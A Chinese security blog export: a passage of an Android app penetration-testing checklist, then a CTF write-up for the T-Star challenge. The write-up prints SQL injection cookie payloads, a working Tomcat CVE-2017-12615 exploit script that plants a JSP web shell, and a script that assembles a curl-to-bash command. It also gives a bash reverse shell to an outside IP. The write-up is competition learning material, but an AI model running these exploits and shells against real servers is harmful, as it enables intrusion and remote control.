<h4 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h4><p>​    检查 AndroidManifest.xml 文件中各组件定义标签的安全属性是否设置恰当。如果组件无须跨进程交互，则不应设置 exported 属性为 true。例如，如下图所示，当 com.umeng.message.XiaomiIntentService 的 exported属性为 true 时，将可以被其他应用调用。（当有设置权限(permissions)时，需要再考察权限属性。如 android:protectionLevel 为 signature 或 signatureOrSystem 时，只有相同签名的 apk才能获取权限。详情见附录参考资料API Guides 系统权限简介 ）</p>
<p><img src="https://image.3001.net/images/20200710/15943658358575.png" alt="image-20200629150016127"></p>
<p>​    当发现有可利用的组件导出时，（当然，并不是说所有导出的组件都是不安全的，如果要确定，必须看代码，对代码逻辑进行分析）可利用drozer测试工具进行测试。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drozer安装：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;4ef5b26dd3fb</span><br><span class="line">drozer使用：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;dfa92bab3a55</span><br></pre></td></tr></table></figure>

<h2 id="2-敏感信息安全"><a href="#2-敏感信息安全" class="headerlink" title="2.敏感信息安全"></a>2.敏感信息安全</h2><h3 id="2-1数据文件"><a href="#2-1数据文件" class="headerlink" title="2.1数据文件"></a>2.1数据文件</h3><p>​    首先查看相关文件的权限配置，正常的文件权限最后三位应为空（类似”rw-rw—-“）,即除应用自己以外任何人无法读写；目录则允许多一个执行位（类似“rwxrwx—x”）。如下图：</p>
<p><img src="https://image.3001.net/images/20200710/15943658388450.png" alt="image-20200629160646287"></p>
<p>​    权限检测完整后，再检查客户端程序存储在手机中的 SharedPreferences 配置文件，通常是对本目录下的文件内容（一般是xml）进行检查，看是否包含敏感信息。最后在检测SQLite 数据库文件，在私有目录及其子目录下查找以.db 结尾的数据库文件。对于使用了 webView 缓存的应用，会在 databases 子目录中保存 webview.db 和 webviewCache.db。其中有可能会记录 cookies 和提交表单等信息。使用数据库查看工具即可查看这些文件中是否有敏感信息。</p>
<p>​    还有些时候，客户端程序 apk 包中也是是保存有敏感信息的，比如检查 apk 包中各类文件是否包含硬编码的的敏感信息等。</p>
<h3 id="2-2Logcat日志"><a href="#2-2Logcat日志" class="headerlink" title="2.2Logcat日志"></a>2.2Logcat日志</h3><p>​    通过adb 工具连接设备：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb devices  &#x2F;&#x2F;查看安卓设备列表</span><br><span class="line">adb -s 设备名称 其它命令  &#x2F;&#x2F;当连接了多个设备时，选择操作的目标设备，否则会出错</span><br><span class="line">adb pull 手机目录名 PC目录名  &#x2F;&#x2F;从安卓设备中复制文件到电脑中</span><br></pre></td></tr></table></figure>

<p>然后使用 WinHex 打开，查看内存遗留信息。</p>
<p>也可以直接用adb查询locat日志：</p>
<p>在adb shell中，有下列命令可用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">logcat  &#x2F;&#x2F;持续输出日志，直到Ctrl+C</span><br><span class="line">logcat -d  &#x2F;&#x2F;一次性输出日志缓存，不会阻塞</span><br><span class="line">logcat -c  &#x2F;&#x2F;清空日志缓存</span><br></pre></td></tr></table></figure>

<h2 id="3-密码安全"><a href="#3-密码安全" class="headerlink" title="3.密码安全"></a>3.密码安全</h2><h3 id="3-1键盘劫持"><a href="#3-1键盘劫持" class="headerlink" title="3.1键盘劫持"></a>3.1键盘劫持</h3><p>​    通常来说，只有使用系统输入法的编辑框才能够进行键盘码记录。如果是自制的软键盘，则可以尝试进行触摸屏记录。像下图这样，不使用系统输入法，且按键随机分布的软键盘是安全的。</p>
<p><img src="https://image.3001.net/images/20200710/15943658435573.png" alt="image-20200629173937788"></p>
<h3 id="3-2随机布局软件盘"><a href="#3-2随机布局软件盘" class="headerlink" title="3.2随机布局软件盘"></a>3.2随机布局软件盘</h3><p>​    当客户端软键盘未进行随机化处理时为低风险;当客户端软键盘只在某一个页面载入时初始化一次而不是在点击输入框时重新进行随机化也为低风险。</p>
<h3 id="3-3屏幕录像"><a href="#3-3屏幕录像" class="headerlink" title="3.3屏幕录像"></a>3.3屏幕录像</h3><p>​    使用ADB进行测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell &#x2F;system&#x2F;bin&#x2F;screencap -p 输出png路径（安卓设备中）</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200710/1594365848230.png" alt="image-20200709161454548"></p>
<p>​    运行截图命令后，可以在 /mnt/sdcard/ 目录中查看到存在1.png</p>
<p><img src="https://image.3001.net/images/20200710/15943658509313.png" alt="image-20200709162105260"></p>
<p>​    打开查看：</p>
<p><img src="https://image.3001.net/images/20200710/15943658547041.jpg" alt="Screenshot_20200709_162157_com.android.gallery3d"></p>
<p>成功截图。</p>
<p>​    攻击者可以在用户进入登录页面，在输入密码的同时，进行连续截图，即可记录用户输入的密码。如果没有防截屏，那么即使是随机分布的、没有视觉反馈的软键盘也会被记录：<br>​    还有一种验证方式是从代码方面进行验证：首先检测需较高安全性的窗口（如密码输入框），看代码中在窗口加载时是否有类似下图的代码。按照 android SDK 的要求，开启 FLAG_SECURE 选项的窗口不能被截屏。</p>
<p><img src="https://image.3001.net/images/20200710/15943658647619.png" alt="image-20200709162413334"></p>
<p>目前 FLAG_SECURE 测试结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">N－PASS，可截图，</span><br><span class="line">ZTE 880E, 可截图</span><br><span class="line">ASUS TF300T，可阻止工具及 ddms 截图。</span><br></pre></td></tr></table></figure>

<h3 id="3-4手势密码"><a href="#3-4手势密码" class="headerlink" title="3.4手势密码"></a>3.4手势密码</h3><p>​    手势密码的复杂度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.进入客户端设置手势密码的页面进行手势密码设置。</span><br><span class="line">2.进行手势密码设置，观察客户端手势密码设置逻辑是否存在最少点位的判断。</span><br><span class="line">3.反编译 APK 为 jar 包，通过 jd-gui 观察对应代码逻辑是否有相应的判断和限制条件。（一般设置手势密码若输入点数过少时会有相应的文字提示，通过此文字提示可以快速定位到代码位置）</span><br></pre></td></tr></table></figure>

<p>​    手势密码的修改和取消：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.进入客户端设置手势密码的位置，一般在个人设置或安全中心等地方。</span><br><span class="line">2.进行手势密码修改或取消操作，观察进行此类操作时是否需要输入之前的手势密码或普通密码。</span><br><span class="line">3.观察在忘记手势密码等其他客户端业务逻辑中是否存在无需原始手势或普通密码即可修改或取消手势密码的情况。</span><br><span class="line">4.多次尝试客户端各类业务，观察是否存在客户端逻辑缺陷使得客户端可以跳转回之前业务流程所对应页面。若存在此类逻辑（例如手势密码设置），观察能否修改或取消手势密码。</span><br><span class="line">5.反编译 APK 为 jar 包，通过 jd-gui 观察对应代码逻辑，寻找客户端对于手势密码的修改和删除是否存在相应的安全策略。</span><br></pre></td></tr></table></figure>

<p>​    手势密码的本地信息保存：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.首先通过正常的操作流程设置一个手势密码并完整一次完整的登陆过程。</span><br><span class="line">2.寻找&#x2F;data&#x2F;data 的私有目录下是否存在手势密码对应敏感文件，若进行了相关的信息保存，基本在此目录下。（关键词为 gesture，key 等）</span><br><span class="line">3.若找到对应的文件，观察其存储方式，为明文还是二进制形式存储，若为二进制形式，观察其具体位数是否对应进行 MD5（二进制 128 位，十六进制 32 位或 16 位）、SHA-1（二进制 160 位，十六进制 40 位）等散列后的位数。如果位数对应，即可在反编译的jar包中搜索对应的关键字以迅速对应代码。</span><br><span class="line">4.通过代码定位确认其是否进行了除单项哈希散列之外的加密算法，若客户端未将手势密码进行加密或变形直接进行散列处理可认为其不安全，一是因为现阶段 MD5、SHA-1 等常用的哈希算法已被发现碰撞漏洞，二是网络中存在 www.somd5.com 等散列值查询网站可以通过大数据查询的方式获取散列前的明文手势密码。</span><br></pre></td></tr></table></figure>

<p>​    手势密码的锁定策略：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.首先通过正常的操作流程设置一个手势密码。</span><br><span class="line">2.输入不同于步骤 1 中的手势密码，观察客户端的登陆状态及相应提示。若连续输入多次手势密码错误，观察当用户处于登陆状态时是否退出当前的登陆状态并关闭客户端；当</span><br><span class="line">客户未处于登录状态时是否关闭客户端并进行一定时间的输入锁定。</span><br><span class="line">3.反编译 APK 为 jar 包，通过 jd-gui 观察对应代码逻辑，寻找客户端是否针对输入次数及锁定时间有相应的逻辑处理。</span><br></pre></td></tr></table></figure>

<p>​    手势密码的抗攻击测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.下载并安装 Xposed 框架及 SwipeBack 插件。</span><br><span class="line">2.启动客户端并进入手势密码输入页。</span><br><span class="line">3.启动 SwipeBack 插件，观察是否可以通过滑动关闭手势密码输入页的方式进入登陆后的页面。</span><br></pre></td></tr></table></figure>

<h2 id="4-安全策略"><a href="#4-安全策略" class="headerlink" title="4.安全策略"></a>4.安全策略</h2><h3 id="4-1密码复杂度检测："><a href="#4-1密码复杂度检测：" class="headerlink" title="4.1密码复杂度检测："></a>4.1密码复杂度检测：</h3><p>​    测试客户端程序是否检查用输入的密码强度，禁止设置弱口令。</p>
<h3 id="4-2账号登录限制："><a href="#4-2账号登录限制：" class="headerlink" title="4.2账号登录限制："></a>4.2账号登录限制：</h3><p>​    测试一个帐号是否可以同时在多设备上成功登录客户端，进行操作。 </p>
<h3 id="4-3账户锁定策略"><a href="#4-3账户锁定策略" class="headerlink" title="4.3账户锁定策略"></a>4.3账户锁定策略</h3><p>​    测试客户端是否限制登录尝次数。 防止木马使用穷举法暴力破解用户密码。</p>
<h3 id="4-4问题验证"><a href="#4-4问题验证" class="headerlink" title="4.4问题验证"></a>4.4问题验证</h3><p>​    测试对账号某些信息（如单次支付限额）的修改是否有私密问题验证。私密问题验证是否将问题和答案一一对应。私密问题是否足够机密。</p>
<h3 id="4-5会话安全"><a href="#4-5会话安全" class="headerlink" title="4.5会话安全"></a>4.5会话安全</h3><p>​    测试客户端在超过20分钟无操作后，是否会使会话超时并要求重新登录。超时时间是否合理。</p>
<h3 id="4-6界面切换保护"><a href="#4-6界面切换保护" class="headerlink" title="4.6界面切换保护"></a>4.6界面切换保护</h3><p>​    检查客户端程序在切换到其他应用时，已经填写的账号密码等敏感信息是否会清空，防止用户敏感信息泄露。如果切换前处于已登录状态，切换后一定时间内是否会自动退出当前会话。</p>
<h3 id="4-7UI信息泄露"><a href="#4-7UI信息泄露" class="headerlink" title="4.7UI信息泄露"></a>4.7UI信息泄露</h3><p>​    检查客户端的各种功能，看是否存在敏感信息泄露问题。使用错误的登录名或密码，看客户端提示是否不同。在显示卡号等敏感信息时是否进行部分遮挡。</p>
<h3 id="4-8验证码安全"><a href="#4-8验证码安全" class="headerlink" title="4.8验证码安全"></a>4.8验证码安全</h3><p>​    测试客户端在登录和交易时是否使用图形验证码。验证码是否符合如下要求:由数字和字母等字符混合组成;采取图片底纹干扰、颜色变换、设置非连续性及旋转图片字体、异字体显示样式等有效方式，防范恶意代码自动识别图片上的信息;具有使用时间限制并仅能使用一次;验证码由服务器生成，客户端文件中不包含图形验证码文本内容。（观察验证码组成,若简单,可以尝试使用PKAVHttpFuzzer的验证码识别工具进行识别）</p>
<h3 id="4-9安全退出"><a href="#4-9安全退出" class="headerlink" title="4.9安全退出"></a>4.9安全退出</h3><p>​    检查客户端在退出时，是否向服务端发送终止会话请求。客户端退出后，还能否使用退出前的会话id访问登录后才能访问的页面。</p>
<h3 id="4-10密码修改验证"><a href="#4-10密码修改验证" class="headerlink" title="4.10密码修改验证"></a>4.10密码修改验证</h3><p>​    测试客户端在修改密码时是否验证旧密码正确性。</p>
<h3 id="4-11Activity界面劫持"><a href="#4-11Activity界面劫持" class="headerlink" title="4.11Activity界面劫持"></a>4.11Activity界面劫持</h3><p>​    安装Hi jackActivity.apk,使用activity 界面劫持工具，在工具中指定要劫持的应用进程名称。如图所示，从列表中选择被测试的应用，点击0K。打开应用，测试工具会尝试用自己的窗口覆盖被测的应用。</p>
<h2 id="5-进程保护"><a href="#5-进程保护" class="headerlink" title="5.进程保护"></a>5.进程保护</h2><h3 id="5-1内存访问和修改"><a href="#5-1内存访问和修改" class="headerlink" title="5.1内存访问和修改"></a>5.1内存访问和修改</h3><p>需要root权限，可以使用MemSpector查看、搜索和修改客户端内存数据，如图所示。用户名密码等数据通常会在/dev/ashmem/dalvik-heap内存段。(目前大多数工具都是通过ptrace接口修改客户端内存，可以使用ptrace机制本身防护。)</p>
<p><img src="https://image.3001.net/images/20200710/15943658745132.png" alt="image-20200710114020175"></p>
<h3 id="5-2动态注入"><a href="#5-2动态注入" class="headerlink" title="5.2动态注入"></a>5.2动态注入</h3><p>​    通过注入动态链接库，hook 客户端某些关键函数，从而获取敏感信息或者改变程序执行。检测 LD_PRELOAD 环境变量。使用 LD_PRELOAD 环境变量，可以让进程预先加载任意 so ，劫持函数。</p>
<h2 id="6-通信安全"><a href="#6-通信安全" class="headerlink" title="6.通信安全"></a>6.通信安全</h2><h3 id="6-1通信加密"><a href="#6-1通信加密" class="headerlink" title="6.1通信加密"></a>6.1通信加密</h3><p>​    如果客户端与服务器之间的通信加密协议实现不当，攻击者将有机会对当前网络环境中其他合法用户的通信内容进行窃听甚至篡改。</p>
<h3 id="6-2证书有效性"><a href="#6-2证书有效性" class="headerlink" title="6.2证书有效性"></a>6.2证书有效性</h3><p>​    主要测试SSL协议安全性、SSL证书验证等。</p>
<h3 id="6-3关键数据加密和校验"><a href="#6-3关键数据加密和校验" class="headerlink" title="6.3关键数据加密和校验"></a>6.3关键数据加密和校验</h3><p>​    测试客户端程序提交数据给服务端时，密码、收款人信息等关键字段是否进行了加密，防止恶意用户嗅探到用户数据包中的密码等敏感信息。</p>
<h3 id="6-4访问控制"><a href="#6-4访问控制" class="headerlink" title="6.4访问控制"></a>6.4访问控制</h3><p>​    测试客户端访问的URL是否仅能由手机客户端访问。是否可以绕过登录限制直接访问登录后才能访问的页面，对需要二次验证的页面(如私密问题验证)，能否绕过验证。</p>
<h3 id="6-5客户端更新安全性"><a href="#6-5客户端更新安全性" class="headerlink" title="6.5客户端更新安全性"></a>6.5客户端更新安全性</h3><p>​    使用代理抓取检测更新的数据包，尝试将服务器返回的更新url替换为恶意链接。看客户端是否会直接打开此链接并下载应用。在应用下载完毕后，测试能否替换下载的apk 文件，测试客户端是否会安装替换后的应用。</p>
<h3 id="6-6短信重放攻击"><a href="#6-6短信重放攻击" class="headerlink" title="6.6短信重放攻击"></a>6.6短信重放攻击</h3><p>​    检测应用中是否存在数据包重放攻击的安全问题。是否会对客户端用户造成短信轰炸的困扰。</p>
<h2 id="7-业务安全"><a href="#7-业务安全" class="headerlink" title="7.业务安全"></a>7.业务安全</h2><h3 id="7-1越权操作"><a href="#7-1越权操作" class="headerlink" title="7.1越权操作"></a>7.1越权操作</h3><p>​    服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致攻击账号拥有了其他账户的增删改查功能。</p>
<h3 id="7-2交易篡改"><a href="#7-2交易篡改" class="headerlink" title="7.2交易篡改"></a>7.2交易篡改</h3><p>​    本项测试主要是修改金额信息(如:转帐金额为负值)，订单信息(如:订单的数量)等</p>
<h3 id="7-3重放攻击"><a href="#7-3重放攻击" class="headerlink" title="7.3重放攻击"></a>7.3重放攻击</h3><p>​    主要就是进行抓包重放(如:重放产品购买、订单创造等)测试。</p>
<h3 id="7-4用户枚举"><a href="#7-4用户枚举" class="headerlink" title="7.4用户枚举"></a>7.4用户枚举</h3><p>​    此类漏洞情境一般是:登录界面无验证码、有明显的返回信息(如:该账号不存在、密码错误等)</p>
<h3 id="7-5暴力破解"><a href="#7-5暴力破解" class="headerlink" title="7.5暴力破解"></a>7.5暴力破解</h3><p>​    主要是测试业务中查询、登录等功能，尝试使用暴力枚举的方式进行破解。</p>
<h3 id="7-6注入-XSS-CSRF"><a href="#7-6注入-XSS-CSRF" class="headerlink" title="7.6注入/XSS/CSRF"></a>7.6注入/XSS/CSRF</h3><p>​    和WEB测试类似，主要测试站点存在的常见的web漏洞。</p>
]]></content>
      <categories>
        <category>APP渗透</category>
      </categories>
      <tags>
        <tag>APP渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>腾讯T-Star高校挑战赛writeup --白给</title>
    <url>/2020/07/05/T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp/</url>
    <content><![CDATA[<p>2020.06.30，参加T-Star高校挑战赛，总共十个题，团队做出来八个，感谢队友带飞。</p>
<p><img src="https://image.3001.net/images/20200820/15979138862144.png" alt="image-20200703143606576"></p>
<a id="more"></a>
<p><img src="https://image.3001.net/images/20200820/15979138893590.png" alt="image-20200703143513478"></p>
<h2 id="1-题目一-签到"><a href="#1-题目一-签到" class="headerlink" title="1.题目一 签到"></a>1.题目一 签到</h2><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>上传为前端js的验证，将php一句话后缀改为jpg，上传抓包修改后缀为php，上传成功</p>
<p><img src="https://image.3001.net/images/20200820/15979138931233.jpg" alt="img"> </p>
<p>查看地址</p>
<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cwps53F.tmp.jpg" alt="img"> </p>
<p>用菜刀连接，查看flag</p>
<p><img src="https://image.3001.net/images/20200820/15979138965960.jpg" alt="img"> </p>
<h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><p>key{K735c9f0D7ddc3b9}</p>
<h2 id="2-题目二-命令执行基础"><a href="#2-题目二-命令执行基础" class="headerlink" title="2.题目二 命令执行基础"></a>2.题目二 命令执行基础</h2><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>用&amp;&amp;不行，采用管道符执行。</p>
<p><img src="https://image.3001.net/images/20200820/1597913899135.png" alt="image-20200703143926169"></p>
<p>执行结果：</p>
<p><img src="https://image.3001.net/images/20200820/15979139024954.png" alt="image-20200703143935690"></p>
<p>通过查看上级目录文件不断查看，找打key文件位置。cat查看内容</p>
<p><img src="https://image.3001.net/images/20200820/15979139049157.png" alt="image-20200703143940672"></p>
<p>查看结果:</p>
<p><img src="https://image.3001.net/images/20200820/15979139063878.png" alt="image-20200703143950416"></p>
<h3 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{usderhky}</p>
<h2 id="3-题目三-你能爆破吗"><a href="#3-题目三-你能爆破吗" class="headerlink" title="3.题目三 你能爆破吗"></a>3.题目三 你能爆破吗</h2><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>admin admin弱口令登进去，发现回显cookie，可以用cookie注入，cookie为用户名的base64编码，所以还需要把payload进行base64编码<br>首先判断字段数，暴出位置，<br>暴库payload：<br>-admin” union select 1,2,database()#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</p>
<p><img src="https://image.3001.net/images/20200820/15979139095751.png" alt="image-20200703144314036"></p>
<p>爆表：<br>-admin” union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkj</p>
<p><img src="T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp%5Cimage-20200703144320621.png" alt="image-20200703144320621"></p>
<p>暴字段：<br>-admin” union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’flag’#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSdmbGFnJyM=</p>
<p><img src="https://image.3001.net/images/20200820/15979139111132.png" alt="image-20200703144332264"></p>
<p>暴值：<br>-admin” union select 1,2,group_concat(flag) from flag#</p>
<p><img src="https://image.3001.net/images/20200820/15979139173893.png" alt="image-20200703144338860"></p>
<h3 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{a405ef895ef46d96}</p>
<h2 id="4-题目四-文件上传"><a href="#4-题目四-文件上传" class="headerlink" title="4.题目四 文件上传"></a>4.题目四 文件上传</h2><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>上传抓包修改文件后缀，php被过滤不能上传，用pht也可以解析成php，图片内容之后加上php代码查看phpinfo发现被过滤了前面的尖括号、问号和php</p>
<p><img src="https://image.3001.net/images/20200820/15979139201294.png" alt="image-20200703144445977"></p>
<p>使用双写绕过</p>
<p><img src="https://image.3001.net/images/20200820/15979139224640.png" alt="image-20200703144532773"></p>
<p>查看成功解析</p>
<p><img src="https://image.3001.net/images/20200820/15979139251914.png" alt="image-20200703144537190"></p>
<p>构造payload重传，</p>
<p><img src="https://image.3001.net/images/20200820/15979139293979.png" alt="image-20200703144542942"></p>
<p>解析页面传参代码执行得到flag</p>
<p><img src="https://image.3001.net/images/20200820/15979139313873.png" alt="image-20200703144548208"></p>
<h3 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{Aa3c7c37508E40B3}</p>
<h2 id="5-题目五-文件包含GetShell"><a href="#5-题目五-文件包含GetShell" class="headerlink" title="5.题目五 文件包含GetShell"></a>5.题目五 文件包含GetShell</h2><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>查看源码，发现了lfi.txt，查看lfi.txt，发现可以文件包含，上传只能上传txt类型</p>
<p><img src="https://image.3001.net/images/20200820/15979139353525.png" alt="image-20200703144845841"></p>
<p>把php一句话压缩成zip</p>
<p><img src="https://image.3001.net/images/20200820/15979139375033.png" alt="image-20200703144849819"></p>
<p>压缩之后修改后缀为txt，上传成功</p>
<p><img src="https://image.3001.net/images/20200820/15979139421111.png" alt="image-20200703144857316"></p>
<p>用php伪协议phar://解压进行利用<br><a href="http://c3c85e3a.yunyansec.com/lfi.php?file=phar://files/Z47zIdPkWHq5l5DQ.txt/33" target="_blank" rel="noopener">http://c3c85e3a.yunyansec.com/lfi.php?file=phar://files/Z47zIdPkWHq5l5DQ.txt/33</a><br>菜刀连接找到flag</p>
<p><img src="https://image.3001.net/images/20200820/15979139441963.png" alt="image-20200703144902999"></p>
<p>查看</p>
<p><img src="https://image.3001.net/images/20200820/15979139473868.png" alt="image-20200703144906810"></p>
<h3 id="flag值：-4"><a href="#flag值：-4" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{weisuohenzhongyao}</p>
<h2 id="6-题目六-成绩单"><a href="#6-题目六-成绩单" class="headerlink" title="6.题目六 成绩单"></a>6.题目六 成绩单</h2><h3 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h3><p>post注入，单引号字符型注入，啥都没过滤，写wp就直接用sqlmap跑了。</p>
<p>post抓包得到请求包，保存为1.txt</p>
<p><img src="https://image.3001.net/images/20200820/15979139501457.jpg" alt="img"> </p>
<p>sqlmap一把梭</p>
<p>暴值得到flag：sqlmap.py -r 1.txt -D web1 –level 3 -T fl4g -C flag –dump</p>
<p><img src="https://image.3001.net/images/20200820/15979139557225.jpg" alt="img"> </p>
<h3 id="flag值：-5"><a href="#flag值：-5" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{Sql_INJECT0N_4813drd8hz4}</p>
<h2 id="7-题目七-小猫咪踩灯泡"><a href="#7-题目七-小猫咪踩灯泡" class="headerlink" title="7.题目七 小猫咪踩灯泡"></a>7.题目七 小猫咪踩灯泡</h2><h3 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h3><p>CVE-2017-12615，github找exp，原理是通过上传jsp的脚本来拿到webshell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def attack(url):</span><br><span class="line">	user_agent&#x3D;&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;51.0.2704.103 Safari&#x2F;537.36&quot;</span><br><span class="line">	headers&#x3D;&#123;&quot;User-Agent&quot;:user_agent&#125;</span><br><span class="line">	data&#x3D;&quot;&quot;&quot;&lt;%</span><br><span class="line">    if(&quot;fff&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;&quot;&quot;&quot;</span><br><span class="line">	try:</span><br><span class="line">		requests.put(url, headers&#x3D;headers, data&#x3D;data)</span><br><span class="line">		time.sleep(2)</span><br><span class="line">		verify_response &#x3D; requests.get(url[:-1], headers&#x3D;headers)</span><br><span class="line">		if verify_response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">			print &#39;success!&#39;</span><br><span class="line">		else :</span><br><span class="line">			print verify_response.status_code</span><br><span class="line">	except :</span><br><span class="line">		&quot;error&quot;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	target_url &#x3D; sys.argv[1] + &#39;2017126151.jsp&#x2F;&#39;</span><br><span class="line">	attack(target_url)</span><br><span class="line">	print &#39;shell: &#39; + target_url[:-1]</span><br></pre></td></tr></table></figure>

<p>运行脚本，上传shell，得到shell位置，提交参数查询得到flag</p>
<p><a href="http://31a9f418.yunyansec.com/2017126151.jsp?pwd=fff&amp;cmd=cat%20flag.txt" target="_blank" rel="noopener">http://31a9f418.yunyansec.com/2017126151.jsp?pwd=fff&amp;cmd=cat%20flag.txt</a></p>
<p><img src="https://image.3001.net/images/20200820/15979139603769.png" alt="image-20200703145708208"></p>
<h3 id="flag值：-6"><a href="#flag值：-6" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{54e47be053bf6ea1}</p>
<h2 id="8-题目八-分析代码获得flag"><a href="#8-题目八-分析代码获得flag" class="headerlink" title="8.题目八 分析代码获得flag"></a>8.题目八 分析代码获得flag</h2><h3 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h3><p>运行脚本文件，写入payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"></span><br><span class="line">payload &#x3D; [</span><br><span class="line">    &#39;&gt;ls\\&#39;, </span><br><span class="line">    &#39;ls&gt;_&#39;, </span><br><span class="line">    &#39;&gt;\ \\&#39;, </span><br><span class="line">    &#39;&gt;-t\\&#39;, </span><br><span class="line">    &#39;&gt;\&gt;g&#39;, </span><br><span class="line">    &#39;ls&gt;&gt;_&#39;, </span><br><span class="line"></span><br><span class="line">    &#39;&gt;sh&#39;, </span><br><span class="line">    &#39;&gt;ba\\&#39;, </span><br><span class="line">    &#39;&gt;\|\\&#39;,</span><br><span class="line">    &#39;&gt;32\\&#39;,</span><br><span class="line">    &#39;&gt;1.\\&#39;,</span><br><span class="line">    &#39;&gt;5\\&#39;, </span><br><span class="line">    &#39;&gt;2.\\&#39;,</span><br><span class="line">    &#39;&gt;10\\&#39;, </span><br><span class="line">    &#39;&gt;9.\\&#39;, </span><br><span class="line">    &#39;&gt;3\\&#39;, </span><br><span class="line">    &#39;&gt;\ \\&#39;, </span><br><span class="line">    &#39;&gt;rl\\&#39;, </span><br><span class="line">    &#39;&gt;cu\\&#39;, </span><br><span class="line"></span><br><span class="line">    # exec</span><br><span class="line">    &#39;sh _&#39;, </span><br><span class="line">    &#39;sh g&#39;, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;82da9c13.yunyansec.com&#x2F;?reset&#x3D;1&#39;)</span><br><span class="line">for i in payload:</span><br><span class="line">    assert len(i) &lt;&#x3D; 5 </span><br><span class="line">    r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;82da9c13.yunyansec.com&#x2F;?1&#x3D;&#39; + quote(i) )</span><br><span class="line">    print(i)</span><br><span class="line">    sleep(0.2)</span><br></pre></td></tr></table></figure>

<p>服务器配置，在index.php中写入脚本<br>bash -i &gt;&amp; /dev/tcp/39.105.51.32/8080 0&gt;&amp;1<br>nc监听，运行脚本，反弹shell<br>nc -lvvp 8080<br>终端中查看文件内容得到flag<br>flag{a1c8BFF2}</p>
<p>之后看第一名战队的wp，还可以用cat读取上级目录中的文件内容来获取flag</p>
<p><img src="https://image.3001.net/images/20200820/15979139665019.png" alt="image-20200703151818734"></p>
<h3 id="flag值：-7"><a href="#flag值：-7" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{a1c8BFF2}</p>
